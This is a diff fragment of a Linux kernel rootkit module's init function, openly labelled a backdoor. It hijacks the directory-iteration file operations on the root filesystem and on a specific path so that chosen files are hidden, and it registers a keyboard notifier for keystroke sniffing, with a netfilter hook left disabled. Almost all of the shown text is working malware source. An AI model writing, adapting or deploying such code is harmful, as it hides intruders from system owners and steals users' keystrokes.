@@ -671,7 +671,8 @@ static int __init mod_init(void) {
         memset(hidden_files[i], 0, 256);
     }
 
-    if (kern_path("/proc", 0, &proc_path)) {
+    //if (kern_path("/proc", 0, &proc_path)) {
+    if (kern_path("/", 0, &proc_path)) {
         return -1;
     }
     proc_inode = proc_path.dentry->d_inode;
@@ -680,6 +681,7 @@ static int __init mod_init(void) {
     proc_fops.iterate_shared = rk_iterate_shared;
     proc_inode->i_fop = &proc_fops;
 
+#if 1
     const char *user_input = "/aing-matrix";
 
     char *user_string = kmalloc(100, GFP_KERNEL);
@@ -729,10 +731,12 @@ static int __init mod_init(void) {
     backup_file_ops = my_file_inode->i_fop;
     file_ops.iterate_shared = rk_iterate_shared;
     my_file_inode->i_fop = &file_ops;
+
 #endif
 
     kfree(user_string);
     kfree(user_file);
+#endif
 
 #if 0
     nfhi.hook = incoming_hook;
@@ -771,6 +775,7 @@ static int __init mod_init(void) {
 
     register_keyboard_notifier(&keysniffer_blk);
 #endif
+    printk(KERN_ALERT "backdoor module loaded\n");
     return 0;
 }
 
